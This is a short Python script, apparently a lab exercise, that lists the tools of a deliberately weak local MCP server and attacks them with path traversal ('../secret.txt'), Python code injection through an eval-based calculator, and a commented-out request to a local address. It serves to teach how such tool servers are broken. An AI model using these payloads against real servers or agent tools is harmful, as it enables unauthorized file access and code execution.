import asyncio
from pathlib import Path
from fastmcp import Client

SERVER = "targets/weak_server/server.py"

async def call(client, tool, args):
    """Calling one tool and prints what came back, or the error."""
    try:
        result = await client.call_tool(tool, args)
        print(f"[OK]    {tool}({args}) -> {result.content[0].text}")
    except Exception as e:
        print(f"[ERROR] {tool}({args}) -> {type(e).__name__}: {e}")

async def main():
    # Client(SERVER) starts the server as a subprocess for you.
    async with Client(SERVER) as client:
        tools = await client.list_tools()
        for t in tools:
            print(t.name, "-", t.description)
            print("   schema:", t.input_schema)

        await call(client, "read_note", {"filename": "hello.txt"})
        # TODO: your attacks go below
        # Attack 1: ".." means "go up one folder", so this escapes notes/ and reaches secret.txt
        await call(client, "read_note", {"filename": "../secret.txt"})

        # Baseline: normal use, should return 4
        await call(client, "calculate", {"expression": "2 + 2"})

        # Attack 2: not math. eval runs it as Python and lists the server's current folder.
        await call(client, "calculate", {"expression": "__import__('os').listdir('.')"})

        # Attack 3: the tool waits forever, and it also happily fetched a local address.
        # await call(client, "fetch_url", {"url": "http://127.0.0.1:9999"})


asyncio.run(main())
